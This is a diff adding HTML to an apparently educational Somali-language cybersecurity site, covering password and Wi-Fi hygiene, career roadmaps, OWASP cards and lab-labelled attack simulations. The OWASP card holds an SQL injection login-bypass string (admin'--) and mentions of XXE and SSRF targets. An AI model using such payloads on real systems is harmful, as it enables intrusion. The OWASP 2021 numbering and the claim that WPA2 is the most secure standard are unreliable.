+    <div class="card">
+      <div class="ctit">📶 Habaynta Router-kaaga Guriga</div>
+      <div class="cbody">
+        <strong style="color:var(--ng)">✅ SSID & Password Beddel:</strong> Ha isticmaalin magaca iyo erayga sirta ah ee shirkaddu la timid. Dooro magac aan muujinayn macluumaad shakhsi ah.<br><br>
+        <strong style="color:var(--cy)">✅ SSID Qari:</strong> Router-kaaga ka dhig inuusan soo bandhigin magaca shabakaddaada — mid aan si fudud loo arki karin.<br><br>
+        <strong style="color:var(--ep)">✅ WPA2 Isticmaal:</strong> Hubi in router-kaagu isticmaalayo WPA2 — kan ugu ammaansan.
+        <strong style="color:var(--gd)">✅ IoT Network:</strong> Samee shabakad gaar ah (isolated) oo kaliya loogu talagalay qalabkaaga IoT.
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔓 Public Wi-Fi — Khataraha</div>
+      <div class="cbody">
+        Wi-Fi-ga laga helo meelaha dadweynaha sida maqaayadaha iyo garoomada diyaaradaha <strong>inta badan ma aha mid ammaan ah.</strong><br><br>
+        🚫 Ha isticmaalin si aad u galiso macluumaad xasaasi ah sida bangiga ama email-ka shaqada<br><br>
+        🚫 Hubi in file sharing uu dansan yahay<br><br>
+        ✅ <strong>VPN isticmaal:</strong> Wuxuu abuuraa tunnel sireysan oo u dhexeeya qalabkaaga iyo server-ka VPN. Xitaa haddii qof isku dayo inuu basaaso xogtaada, wuxuu arki doonaa oo kaliya xog sireysan.
+      </div>
+    </div>
+  </div>
+
+  <!-- PASSWORD MANAGEMENT -->
+  <span class="slb" style="display:block">// 4. PASSWORD MANAGEMENT — MAAREYNTA password</span>
+  <div class="g3" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">⚠️ Khaladka Ugu Caansan</div>
+      <div class="cbody">Dad badan ayaa sameeya qaladka ah inay isticmaalaan <strong>hal password oo isku mid ah</strong> dhammaan akoonnadooda. Tani waa halis weyn — haddii tuug helo password ee hal meel, wuxuu isku dayi doonaa inuu ku galo dhammaan akoonnadaada kale.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔐 Sida Loo sameeyo Password Adag</div>
+      <div class="cbody">
+        ✅ <strong>Ha isticmaalin</strong> macluumaad shakhsi ah (magacaaga, taariikhdaada dhalashada)<br>
+        ✅ <strong>Dherer:</strong> 12+ xaraf — mar kasta oo uu dheeraado, way fiican tahay<br>
+        ✅ <strong>Isku-dhaf:</strong> Xarfo waaweyn + yaryar + lambar + astaamo (!@#$)<br>
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🗝️ Password Manager</div>
+      <div class="cbody">Si ammaan ah kuugu kaydinayaa dhammaan passwords. Oo kaliya inaad xasuusato hal master password si aad u gasho.<br><br>
+        <strong style="color:var(--ng)">Bilaash ah:</strong> Bitwarden, KeePassXC<br>
+        <strong style="color:var(--cy)">Lacag yar:</strong> 1Password, Dashlane
+      </div>
+    </div>
+  </div>
+
+  <!-- DATA PROTECTION -->
+  <span class="slb" style="display:block">// 5. ILAALINTA XOGTAADA — DATA PROTECTION</span>
+  <div class="g3" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🔒 Encryption — Siraynta Xogta</div>
+      <div class="cbody">Sirayntu waa habka xogta loogu beddelo qaab aan la akhriyi karin haddii aan la haysan fure gaar ah.<br><br>Haddii laptop-kaaga la xado laakiin hard drive-ka uu <strong>sireysan yahay</strong> — tuuggu ma awoodi doono inuu akhriyo faylashaada.<br><br>Windows waxay leedahay <strong>Encrypting File System (EFS)</strong>.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">💾 Data Backup — 3-2-1 Rule</div>
+      <div class="cbody">
+        <strong style="color:var(--ng)">3</strong> Nuqul oo xogta ah<br>
+        <strong style="color:var(--cy)">2</strong> Nooc oo kala duwan (hard drive + cloud)<br>
+        <strong style="color:var(--ep)">1</strong> Nuqul meel fog ah<br><br>
+        Ransomware-ka kaliya waxaa ka difaaca backup wanaagsan. <strong>Xaqiiji</strong> in backup-ku shaqeeyo .
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🗑️ Tirtiridda Xogta Joogto ah</div>
+      <div class="cbody">Marka aad fayl u rarto Recycle Bin oo aad "tirtirto" — dhab ahaantii faylka si buuxda looma tirtirin. Waxaa suurtagal ah in la soo celiyo.<br><br>Si aad si joogto ah u tirtirto: isticmaal <strong>file shredder software</strong> oo dhowr jeer ku kor qora xog aan macno lahayn meesha faylku yaallay.</div>
+    </div>
+  </div>
+
+  <!-- 2FA -->
+  <span class="slb" style="display:block">// 6. XAQIIJINTA AQOONSIGA — 2FA & OAUTH</span>
+  <div class="g2">
+    <div class="card">
+      <div class="ctit">🔐 Two-Factor Authentication (2FA)</div>
+      <div class="cbody">Lakab amni dheeri ah oo u baahan inaad bixiso <strong>laba nooc oo aqoonsi ah</strong> si aad u gasho akoonkaaga:<br><br>
+        🧠 <strong>Shay aad taqaan:</strong> Password-kaaga<br>
+        📱 <strong>Shay aad haysato:</strong> Taleefankaaga (code SMS )<br>
+        👁️ <strong>Shay adiga kuu gaar ah:</strong> Farahaaga ama wejigaaga<br><br>
+        Google, Apple, iyo Facebook waxay bixiyaan 2FA — <strong>hawlgeli</strong> si akoonnadaada looga dhigo kuwo aad u ammaan badan.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔑 OAuth 2.0</div>
+      <div class="cbody">Hab-maamuus u oggolaanaya barnaamijyada inay si ammaan ah u helaan macluumaad kooban oo ku saabsan akoonkaaga <strong>adigoon siin password-kaaga.</strong><br><br>Tusaale: marka barnaamij cusub ku weydiiyo inaad "ku gasho akoonkaaga Google" — wuxuu isticmaalayaa OAuth. Google wuxuu siinayaa <strong>token</strong> gaar ah oo u oggolaanaysa marin xaddidan — marnaba ma siinayo password-kaaga.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  ROADMAPS
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="roadmaps">
+  <span class="slb">// BONUS — INTERACTIVE ROADMAPS</span>
+  <h2 class="stit">INTERACTIVE <span class="a2">ROADMAPS</span></h2>
+  <p class="sdesc">Dooro jidkaaga xirfada cybersecurity-ga.</p>
+  <div class="rtabs">
+    <button class="rtab active" onclick="showRM('web',this)">🕸️ Web PenTest</button>
+    <button class="rtab" onclick="showRM('soc',this)">🔵 SOC Analyst</button>
+    <button class="rtab" onclick="showRM('net',this)">🌐 Network Security</button>
+    <button class="rtab" onclick="showRM('mob',this)">📱 Mobile Hacking</button>
+  </div>
+  <!-- WEB -->
+  <div class="rpanel active" id="rm-web">
+    <div class="rsteps">
+      <div class="rstep" onclick="toggleStep(this,'web')"><div class="schk">✓</div><div class="snum">STEP 01</div><div class="sich">🌐</div><div class="stit2">HTML/CSS/JS Basics</div><div class="sso">Webka sida loo dhiso. DOM, Events, iyo sida browser-ku u shaqeeyo. Aasaaska loo baahan yahay si nuglaanta la fahmo.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'web')"><div class="schk">✓</div><div class="snum">STEP 02</div><div class="sich">📡</div><div class="stit2">HTTP Protocols</div><div class="sso">GET, POST, PUT, DELETE. Headers, Cookies, Sessions, Status codes. HTTP vs HTTPS. Proxy-ga sida loo isticmaalo.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'web')"><div class="schk">✓</div><div class="snum">STEP 03</div><div class="sich">⚠️</div><div class="stit2">OWASP Top 10</div><div class="sso">10-ka nuglaansho ugu khatarta badan webka: SQL Injection, XSS, CSRF, IDOR, SSRF iyo kuwa kale.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'web')"><div class="schk">✓</div><div class="snum">STEP 04</div><div class="sich">🔧</div><div class="stit2">Burp Suite Mastery</div><div class="sso">Proxy, Repeater, Intruder, Scanner, Decoder. Web application testing ugu muhiimsan tool-ka.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'web')"><div class="schk">✓</div><div class="snum">STEP 05</div><div class="sich">💰</div><div class="stit2">Bug Bounty Hunting</div><div class="sso">HackerOne, Bugcrowd iyo Intigriti. Report-ka sida loo qoro, scope faham, lacagta la heli karo.</div></div>
+    </div>
+    <div class="rprog"><span class="prlb">HORUMAR</span><div class="prbw"><div class="prb" id="prb-web" style="width:0%"></div></div><span class="prp" id="prp-web">0%</span></div>
+  </div>
+  <!-- SOC -->
+  <div class="rpanel" id="rm-soc">
+    <div class="rsteps">
+      <div class="rstep" onclick="toggleStep(this,'soc')"><div class="schk">✓</div><div class="snum">STEP 01</div><div class="sich">🌐</div><div class="stit2">Networking Basics</div><div class="sso">OSI Model, TCP/IP, DNS, DHCP. IP addressing, subnetting. Wireshark si aad u aragto traffic-ka.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'soc')"><div class="schk">✓</div><div class="snum">STEP 02</div><div class="sich">📋</div><div class="stit2">Log Analysis</div><div class="sso">Windows Event Logs, Linux Syslog, Firewall logs. Failed logins, unusual traffic, privilege escalation raadi.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'soc')"><div class="schk">✓</div><div class="snum">STEP 03</div><div class="sich">📊</div><div class="stit2">SIEM (Splunk/ELK)</div><div class="sso">Splunk SPL queries, Elasticsearch, Kibana dashboards. Weerar la garan karo alerts iyo correlations.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'soc')"><div class="schk">✓</div><div class="snum">STEP 04</div><div class="sich">🚨</div><div class="stit2">Incident Response</div><div class="sso">NIST IR Framework: Preparation → Identification → Containment → Eradication → Recovery → Lessons.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'soc')"><div class="schk">✓</div><div class="snum">STEP 05</div><div class="sich">🎯</div><div class="stit2">Threat Hunting</div><div class="sso">MITRE ATT&CK framework, IOCs, TTPs, iyo threat intelligence. Proactive si loo raadraaco weerarrada.</div></div>
+    </div>
+    <div class="rprog"><span class="prlb">HORUMAR</span><div class="prbw"><div class="prb" id="prb-soc" style="width:0%"></div></div><span class="prp" id="prp-soc">0%</span></div>
+  </div>
+  <!-- NETWORK -->
+  <div class="rpanel" id="rm-net">
+    <div class="rsteps">
+      <div class="rstep" onclick="toggleStep(this,'net')"><div class="schk">✓</div><div class="snum">STEP 01</div><div class="sich">📚</div><div class="stit2">OSI Model</div><div class="sso">7 Layers: Physical, Data Link, Network, Transport, Session, Presentation, Application. Weerarku meesha u dhacaa.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'net')"><div class="schk">✓</div><div class="snum">STEP 02</div><div class="sich">🔗</div><div class="stit2">TCP/IP Deep Dive</div><div class="sso">Three-way handshake, UDP vs TCP, Routing, NAT, ARP. Wireshark ku dhaqan si aad nool oo aragto.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'net')"><div class="schk">✓</div><div class="snum">STEP 03</div><div class="sich">🔥</div><div class="stit2">Firewalls & VPNs</div><div class="sso">Stateful vs Stateless firewalls, rules iyo policies. VPN protocols: OpenVPN, WireGuard, IPsec.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'net')"><div class="schk">✓</div><div class="snum">STEP 04</div><div class="sich">🔭</div><div class="stit2">Nmap & Wireshark</div><div class="sso">Nmap: SYN scan, version detection, OS fingerprinting, NSE scripts. Wireshark: packet capture, filter, analysis.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'net')"><div class="schk">✓</div><div class="snum">STEP 05</div><div class="sich">🛡️</div><div class="stit2">Network Hardening</div><div class="sso">Network segmentation, VLAN, IDS/IPS, Zero Trust model, network monitoring iyo patch management.</div></div>
+    </div>
+    <div class="rprog"><span class="prlb">HORUMAR</span><div class="prbw"><div class="prb" id="prb-net" style="width:0%"></div></div><span class="prp" id="prp-net">0%</span></div>
+  </div>
+  <!-- MOBILE -->
+  <div class="rpanel" id="rm-mob">
+    <div class="rsteps">
+      <div class="rstep" onclick="toggleStep(this,'mob')"><div class="schk">✓</div><div class="snum">STEP 01</div><div class="sich">📱</div><div class="stit2">Android/iOS Architecture</div><div class="sso">Android: Linux kernel, ART runtime, APK structure, permissions. iOS: Sandbox model, IPA files.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'mob')"><div class="schk">✓</div><div class="snum">STEP 02</div><div class="sich">🔄</div><div class="stit2">APK Reversing</div><div class="sso">APKTool, JADX, dex2jar si aad u aragto source code-ka APK. Manifest check, hardcoded secrets raadi.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'mob')"><div class="schk">✓</div><div class="snum">STEP 03</div><div class="sich">🔬</div><div class="stit2">Static & Dynamic Analysis</div><div class="sso">Static: MobSF, apkleaks. Dynamic: Frida, Objection, adb. Frida waxay kuu oggolaataa runtime manipulation.</div></div>
+      <div class="rstep" onclick="toggleStep(this,'mob')"><div class="schk">✓</div><div class="snum">STEP 04</div><div class="sich">🌐</div><div class="stit2">API Security</div><div class="sso">Mobile apps API isticmaalaan. IDOR, authentication issues, rate limiting, insecure data transmission.</div></div>
+    </div>
+    <div class="rprog"><span class="prlb">HORUMAR</span><div class="prbw"><div class="prb" id="prb-mob" style="width:0%"></div></div><span class="prp" id="prp-mob">0%</span></div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  OWASP TOP 10
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="owasp">
+  <span class="slb">// BONUS — WEB SECURITY</span>
+  <h2 class="stit">WEB PENTEST — <span class="a1">OWASP TOP 10</span></h2>
+  <p class="sdesc">10-ka nuglaansho ugu khatarta badan web applications-yada. Faham mid kasta — sida ay u shaqeyso, sida loo difaaco.</p>
+  <div class="owg">
+    <div class="owc sc"><div class="owr">A01:2021</div><div class="own">SQL Injection</div><div class="ows">Hacker-ku wuxuu gelin code SQL ah input-ka. Login bypass: admin'-- Waxay ku dhici kartaa: xog xadid, database burburin. Xallintu: Parameterized queries, input validation, WAF.</div><span class="owsv">CRITICAL</span></div>
+    <div class="owc sc"><div class="owr">A02:2021</div><div class="own">XSS — Cross-Site Scripting</div><div class="ows">Script-yada xun lagu geliyaa webka si ay ku shaqeyso browser-ka. Reflected, Stored, DOM XSS. Waxay  xadaan cookies, session tokens. Xallintu: Output encoding, CSP headers.</div><span class="owsv">CRITICAL</span></div>
+    <div class="owc sh"><div class="owr">A03:2021</div><div class="own">CSRF</div><div class="ows">Hacker-ku wuxuu ku khasbaynayaa browser inay ficil qaadaan bartilmaameedka — iyada oo aanay garanin. Lacag wareejin link xun. Xallintu: CSRF tokens, SameSite cookies.</div><span class="owsv">HIGH</span></div>
+    <div class="owc sc"><div class="owr">A04:2021</div><div class="own">IDOR</div><div class="ows">URL-ka beddel: /user/1337 → /user/1338 — arki kartaa profile-yada dadka kale. Server-ku ma xaqiijiyo cidda xaq u leh xogta. Xallintu: Access control checks, indirect references.</div><span class="owsv">CRITICAL</span></div>
+    <div class="owc sh"><div class="owr">A05:2021</div><div class="own">SSRF</div><div class="ows">Server-ka ayaa la khasbayaa inuu codsado URL hacker-ku qoondeeyay. Waxay gaari karaan internal services, AWS metadata. Xallintu: URL whitelist, internal network blocking.</div><span class="owsv">HIGH</span></div>
+    <div class="owc sh"><div class="owr">A06:2021</div><div class="own">XXE</div><div class="ows">XML parser-yada nugul waxaa lagu qasbi karaa inay akhriyan /etc/passwd. Hacker-ku wuxuu akhrin karaa files system-ka ama samayn karaa SSRF. Xallintu: Disable external entities.</div><span class="owsv">HIGH</span></div>
+    <div class="owc sc"><div class="owr">A07:2021</div><div class="own">Broken Authentication</div><div class="ows">Nidaamka login-ka nugul: weak passwords, no brute-force protection, session tokens fudud. Xallintu: 2FA, strong session management, account lockout, rate limiting.</div><span class="owsv">CRITICAL</span></div>
+    <div class="owc sm"><div class="owr">A08:2021</div><div class="own">Software & Data Integrity</div><div class="ows">Update-yada iyo software-ka aan la xaqiijin. CI/CD pipeline-yada nugul. Serialization attacks. SolarWinds weerarka waa tusaale dhabta ah. Xallintu: Code signing, dependency verification.</div><span class="owsv">MEDIUM</span></div>
+    <div class="owc sm"><div class="owr">A09:2021</div><div class="own">Security Logging Failures</div><div class="ows">Haddaan logs la hayn, weerarka ma la garan karo. Log injection, sensitive data in logs, no alerting. Incident response-ka aad ayuu u adag yahay logs la'aanta. SIEM, centralized logging.</div><span class="owsv">MEDIUM</span></div>
+    <div class="owc sh"><div class="owr">A10:2021</div><div class="own">Advanced SSRF</div><div class="ows">Cloud environments-yada (AWS, Azure, GCP) Metadata endpoint-yada: 169.254.169.254. Xallintu: Network segmentation, IMDSv2.</div><span class="owsv">HIGH</span></div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  ATTACK VECTORS & TERMINAL
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="attacks">
+  <span class="slb">// BONUS — ATTACK SIMULATIONS</span>
+  <h2 class="stit">ATTACK VECTORS & <span class="a1">TERMINAL</span> SIMULATION</h2>
+  <p class="sdesc">qaar kamid ah sida ay u dhacaan weerarada.</p>
+  <div class="atabs">
+    <button class="atab active" onclick="showAT('ddos',this)">🔴 DDoS & DoS</button>
+    <button class="atab" onclick="showAT('arp',this)">🟡 ARP Spoofing/MITM</button>
+    <button class="atab" onclick="showAT('phish',this)">🟠 Phishing Analysis</button>
+  </div>
+
+  <!-- DDOS -->
+  <div class="apanel active" id="at-ddos">
+    <div class="g2" style="margin-bottom:1.3rem">
+      <div class="card"><div class="ctit">🔴 DoS vs DDoS</div><div class="cbody"><strong>DoS:</strong> Hal machine ayaa u dira codsiyo badan bartilmaameedka si uu u carqaladeeyo.<br><br><strong>DDoS:</strong> Boqolaal ama kumanyaal machine (botnet) ayaa isku mar weerara qaadaya. Aad ayey u adag tahay in la joojiyo.<br><br><strong>Dhacdo dhab ah dhacday:</strong> GitHub 2018 — 1.35 Tbps DDoS — kii ugu weynaa taariikhda.</div></div>
+      <div class="card"><div class="ctit">⚡ DDoS Noocyada</div><div class="cbody"><strong style="color:var(--rd)">Volume-Based:</strong> UDP Flood, ICMP Flood — bandwidth buuxiya<br><br><strong style="color:var(--gd)">Protocol Attacks:</strong> SYN Flood, Ping of Death — TCP handshake<br><br><strong style="color:var(--ep)">Application Layer (L7):</strong> HTTP Flood — web server<br><br><strong style="color:var(--cy)">Amplification:</strong> DNS/NTP — ka yar packet weyn ka dhig</div></div>
+    </div>
+    <div class="tw">
+      <div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="ttitle">arkani659@kali:~$ — DDoS Simulation Lab</span></div>
+      <div class="tbody" id="t-ddos"><div class="tl"><span class="t-p">arkani659@kali</span><span class="t-o" style="padding:0">:</span><span class="t-i">~</span><span class="t-c">$ _</span></div><div class="tl t-w">⚠  EDUCATIONAL LAB — Never use on real targets without permission.</div></div>
+      <div class="tbts">
+        <button class="tbtn" onclick="runT('ddos',1)">SYN Flood</button>
+        <button class="tbtn" onclick="runT('ddos',2)">UDP Flood</button>
+        <button class="tbtn" onclick="runT('ddos',3)">Slowloris</button>
+        <button class="tbtn" onclick="runT('ddos',4)">Detect w/ Nmap</button>
+        <button class="tbtn" onclick="clrT('t-ddos')">🗑 Clear</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ARP -->
+  <div class="apanel" id="at-arp">
+    <div class="card" style="margin-bottom:1.3rem"><div class="ctit">🔀 ARP Spoofing & MITM Sida uu u Shaqeeyo</div><div class="cbody"><strong>ARP (Address Resolution Protocol)</strong> waa hab IP address loola xiriiriyo MAC address. Hacker-ku wuxuu diri karaa jawaab-celin been ah (ARP reply) si uu u maareeyo shabakadda.<br><br>1️⃣ Hacker waxaa u dirayaa router-ka: "MAC-gaygu waa mid hibil"<br>2️⃣ Hacker waxaa u dirayaa hibil: "MAC-gaygu waa mid router-ka"<br>3️⃣ Xogta dhammaanba waxay marta hacker-ka (Man in the Middle)<br>4️⃣ Hacker wuxuu arki karaa, baddeli karaa, ama joojin karaa xogta</div></div>
+    <div class="tw">
+      <div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="ttitle">arkani659@kali:~$ — ARP Spoofing/MITM Lab</span></div>
+      <div class="tbody" id="t-arp"><div class="tl"><span class="t-p">arkani659@kali</span><span class="t-o" style="padding:0">:</span><span class="t-i">~</span><span class="t-c">$ _</span></div><div class="tl t-w">⚠  EDUCATIONAL LAB — marnaba ha u isticmaalin meel aadan fasax u haysanin.</div></div>
+      <div class="tbts">
+        <button class="tbtn" onclick="runT('arp',1)">Network Scan</button>
+        <button class="tbtn" onclick="runT('arp',2)">ARP Spoof</button>
+        <button class="tbtn" onclick="runT('arp',3)">Capture Traffic</button>
+        <button class="tbtn" onclick="runT('arp',4)">Ettercap MITM</button>
+        <button class="tbtn" onclick="clrT('t-arp')">🗑 Clear</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHISH -->
+  <div class="apanel" id="at-phish">
+    <div class="g2" style="margin-bottom:1.3rem">
+      <div class="card"><div class="ctit">🎣  Noocyada Phishing</div><div class="cbody"><strong style="color:var(--rd)">Spear Phishing:</strong> Bartilmaameed go'an (qof ama shirkad)<br><br><strong style="color:var(--gd)">Whaling:</strong> CEO ama xukumad sare<br><br><strong style="color:var(--cy)">Vishing:</strong> Telefoon call (voice phishing)<br><br><strong style="color:var(--ep)">Smishing:</strong> SMS phishing</div></div>
+      <div class="card"><div class="ctit">🛡️ Phishing Ka Bixi</div><div class="cbody">✅ URL-ka hubi — hover before clicking<br>✅ Email headers fahamso — SPF, DKIM, DMARC<br>✅ Domain age hubi (WHOIS)<br>✅ 2FA rakib — password la xado hadduu, still safe<br>✅ Degdeg ha u shaqayn — phishing wuxuu adeegsadaa urgency</div></div>
+    </div>
+    <div class="tw">
+      <div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="ttitle">arkani659@kali:~$ — Phishing Analysis Lab (Defensive)</span></div>
+      <div class="tbody" id="t-phish"><div class="tl"><span class="t-p">arkani659@kali</span><span class="t-o" style="padding:0">:</span><span class="t-i">~</span><span class="t-c">$ _</span></div><div class="tl t-w">⚠  DEFENSIVE LAB — Email headers iyo phishing indicators baadhin.</div></div>
+      <div class="tbts">
+        <button class="tbtn" onclick="runT('phish',1)">Email Header Analysis</button>
+        <button class="tbtn" onclick="runT('phish',2)">URL Scanner</button>
+        <button class="tbtn" onclick="runT('phish',3)">WHOIS Lookup</button>
+        <button class="tbtn" onclick="clrT('t-phish')">🗑 Clear</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 4: NOOCYADA DIFAACA
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c4">
+  <span class="slb">// CUTUBKA 4AAD</span>
+  <h2 class="stit">NOOCYADA <span class="a3">DIFAACA</span> — TYPES OF PROTECTIONS</h2>
+  <p class="sdesc">Heerka hay'adaha iyo shirkadaha, qalabyo iyo farsamooyin xirfadleh ayaa loo isticmaalaa. Halkan waxaad baranaysaa IDS, IPS, VPN, NetFlow, iyo Cyber Attack Chain.</p>
+
+  <!-- SECURITY APPLIANCES -->
+  <span class="slb" style="display:block">// QALABKA AMNIGA EE GAARKA AH — SECURITY APPLIANCES</span>
+  <div class="g3" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🔍 IDS — Intrusion Detection System</div>
+      <div class="cbody">Wuxuu la socdaa dhaqdhaqaaqa shabakadda, wuxuuna raadiyaa calaamado la yaqaan oo weerarro ah ama dhaqan aan caadi ahayn. Marka uu wax helo, <strong>wuxuu soo saaraa digniin</strong> — laakiin ma qaado wax tallaabo ah oo uu ku joojinayo weerarka. Shaqadiisu waa ogaansho iyo warbixin oo kaliya.<br><br>Tusaale: <strong>Snort</strong> — IDS/IPS open source ah.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🛡️ IPS — Intrusion Prevention System</div>
+      <div class="cbody">Si ka duwan IDS, nidaamka IPS wuxuu awood u leeyahay inuu <strong>si toos ah u joojiyo weerarka</strong> marka uu ogaado. Wuxuu dhex fadhiyaa taraafikada shabakadda, wuxuuna tuuri karaa xirmooyinka xogta ee hacker-ka soo diray — ka hor inta aysan gaarsiisan bartilmaameedka.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔐 VPN — Virtual Private Network</div>
+      <div class="cbody">Waxay bixiyaan isku xiriir encryption oo aamin ah oo u dhexeeya shabakado kala duwan ama isticmaaleyaal fogfog iyo shabakadda dhexe. Waxay abuurtaa <strong>tunnel sireysan</strong> — xitaa haddii qof basaasayo, wuxuu arki doonaa oo kaliya xog sireysan.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">📊 NetFlow — Network Monitoring</div>
+      <div class="cbody">Teknoolojiyad ay horumarisay Cisco oo ururisa macluumaadka ku saabsan taraafikada IP-ga. Waxay kuu sheegaysaa: cidda la hadlaysa, goorta, iyo inta ay la hadlayaan. <strong>Baseline</strong> la abuuro — dhaqan caadiyan — kadibna wax kasta oo si weyn uga leexda digniin ayaa la siiyaa.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🦠 AMP — Advanced Malware Protection</div>
+      <div class="cbody">Cisco AMP iyo la mid ah. Barnaamijyada caadiga ah ee ka hortagga fayraska mararka qaarkood way ku guuldareystaan noocyada cusub ee malware-ka. AMP wuxuu falanqeeya dhaqanka faylasha — <strong>behavior-based detection</strong> — halkii signature-ka kaliya laga tiirsanaan lahaa.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🌐 Proxy Server</div>
+      <div class="cbody">Wuxuu u shaqeeyaa sidii dhexdhexaadiye u dhexeeya isticmaaleyaasha gudaha iyo internetka. Waxay shaandheyn karaan codsiyada webka waxayna qarin karaan ciwaannada IP-ga ee gudaha. Content filtering iyo caching sidoo kale waxay samaynayaan.</div>
+    </div>
+  </div>
+
+  <!-- CYBER KILL CHAIN -->
+  <span class="slb" style="display:block">// CYBER KILL CHAIN — LOCKHEED MARTIN</span>
+  <h3 style="font-family:var(--fd);font-size:1.2rem;color:var(--tp);margin-bottom:1rem">Silsiladda Weerarka — 7 Marxaladood</h3>
+  <div class="card" style="margin-bottom:1.5rem">
+    <div class="cbody">
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:.7rem;margin-top:.3rem">
+        <div style="background:rgba(255,0,60,.06);border:1px solid rgba(255,0,60,.2);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--rd);margin-bottom:.3rem">01 · RECONNAISSANCE</div>
+          <div style="font-size:.8rem;color:var(--ts)">Weeraryahanku wuxuu ururiyaa macluumaadka ku saabsan bartilmaameedka</div>
+        </div>
+        <div style="background:rgba(255,102,0,.06);border:1px solid rgba(255,102,0,.2);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:#ff6600;margin-bottom:.3rem">02 · WEAPONIZATION</div>
+          <div style="font-size:.8rem;color:var(--ts)">Wuxuu abuuraa malware oo loogu talagalay bartilmaameedka</div>
+        </div>
+        <div style="background:rgba(255,215,0,.06);border:1px solid rgba(255,215,0,.2);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--gd);margin-bottom:.3rem">03 · DELIVERY</div>
+          <div style="font-size:.8rem;color:var(--ts)">Malware-ka u soo diraa bartilmaameedka — email, USB, website</div>
+        </div>
+        <div style="background:rgba(0,255,65,.05);border:1px solid rgba(0,255,65,.15);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--ng);margin-bottom:.3rem">04 · EXPLOITATION</div>
+          <div style="font-size:.8rem;color:var(--ts)">Malware-ku wuxuu ka faa'iidaystaa nuglaansho si uu u galo</div>
+        </div>
+        <div style="background:rgba(0,245,255,.05);border:1px solid rgba(0,245,255,.15);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--cy);margin-bottom:.3rem">05 · INSTALLATION</div>
+          <div style="font-size:.8rem;color:var(--ts)">Malware-ku wuxuu isku rakibaa nidaamka la weeraray</div>
+        </div>
+        <div style="background:rgba(191,0,255,.05);border:1px solid rgba(191,0,255,.15);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--ep);margin-bottom:.3rem">06 · COMMAND & CONTROL</div>
+          <div style="font-size:.8rem;color:var(--ts)">Malware-ku wuxuu la xiriiraa weeraryahanka si uu amarro u helo</div>
+        </div>
+        <div style="background:rgba(255,0,60,.06);border:1px solid rgba(255,0,60,.2);border-radius:8px;padding:.9rem;grid-column:span 1">
+          <div style="font-family:var(--fd);font-size:.72rem;color:var(--rd);margin-bottom:.3rem">07 · ACTIONS ON OBJECTIVES</div>
+          <div style="font-size:.8rem;color:var(--ts)">Weeraryahanku wuxuu fuliyaa hadafkiisii — xog xadid, burburin, ransomware</div>
+        </div>
+      </div>
+      <div class="gb" style="margin-top:1rem">💡 Fahamka silsiladdan waxay u oggolaanaysaa hay'adaha inay dhisaan difaacyo kala duwan si ay u jabiyaan silsiladda marxalad kasta — haddii hal marxalad la joojiyo, weerarka ma guulaysto.</div>
+    </div>
+  </div>
+
+  <!-- OGAANSHAHA WEERARADA -->
+  <span class="slb" style="display:block">// OGAANSHAHA & KA JAWAABIDDA — DETECTION & RESPONSE</span>
+  <div class="g2" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🔎 La Socodka Joogtada ah</div>
